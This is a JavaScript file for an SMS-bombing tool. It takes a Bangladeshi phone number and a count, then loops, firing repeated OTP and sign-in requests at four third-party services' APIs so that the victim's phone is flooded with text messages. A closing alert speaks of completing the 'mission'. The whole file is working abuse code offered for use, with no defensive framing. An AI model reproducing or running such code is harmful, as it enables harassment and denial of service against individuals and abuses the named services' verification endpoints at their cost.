$('#phone').on('focusin',function(){
    $('.number_text').attr('id','positionChange');

});
$('#phone').on('focusout', function(){
    if (!this.value) {
        $('.number_text').removeAttr('id'); 
    }
});
$('#amount').on('focusin',function(){
    $('.amount_text').attr('id','positionChange');
});
$('#amount').on('focusout', function(){
    if (!this.value) {
        $('.amount_text').removeAttr('id'); 
    }
});
$('#submit').click(()=>{
    const number = $('#phone').val();
    const amount = $('#amount').val();
    if (number.length != 11){
        alert("wrong number");
    }
    else if (amount.length === 0){
        alert("wrong amount");
    }else{

        let i= 0;
        while(i < amount){
            var data = JSON.stringify({
                "mobileNumber": "88"+number+"",
                "countryId": 22
              });
              var config = {
                method: 'post',
                url: 'http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3',
                headers: { 
                  'Content-Type': 'application/json'
                },
                data : data
              };axios(config).then(function (response) {console.log(JSON.stringify(response.data));
              }).catch(function (error) {console.log(error);});  
              i++;

              var data = JSON.stringify({
                "username": "+88"+number+""
              });
              var config = {
                method: 'post',
                url: 'https://api.eat-z.com/auth/customer/signin',
                headers: { 
                  'Content-Type': 'application/json'
                },
                data : data
              };

              axios(config)
              .then(function (response) {
                console.log(JSON.stringify(response.data));
                i++
              })
              .catch(function (error) {
                console.log(error);
              });
              i++;

              var config = {
                method: 'get',
                url: 'http://apibeta.iqra-live.com/api/v2/sent-otp/'+number,
                headers: { 
                  'x-user-channel': 'apps'
                }
              };

              axios(config)
              .then(function (response) {
                console.log(JSON.stringify(response.data));

              })
              .catch(function (error) {
                console.log(error);
              });
              i++;
              var data = JSON.stringify({
                "phone": ""+number+"",
                "country_code": "+880",
                "fcm_token": null
              });

              var config = {
                method: 'post',
                url: 'https://developer.quizgiri.xyz/api/v2.0/send-otp',
                headers: { 
                  'Content-Type': 'application/json'
                },
                data : data
              };
              axios(config)
              .then(function (response) {
                console.log(JSON.stringify(response.data));

              })
              .catch(function (error) {
                console.log(error);
              });

        };
        alert(`${amount} SMS Sent. Keep the Browser Three minutes for complete your mission.`)
    }
});
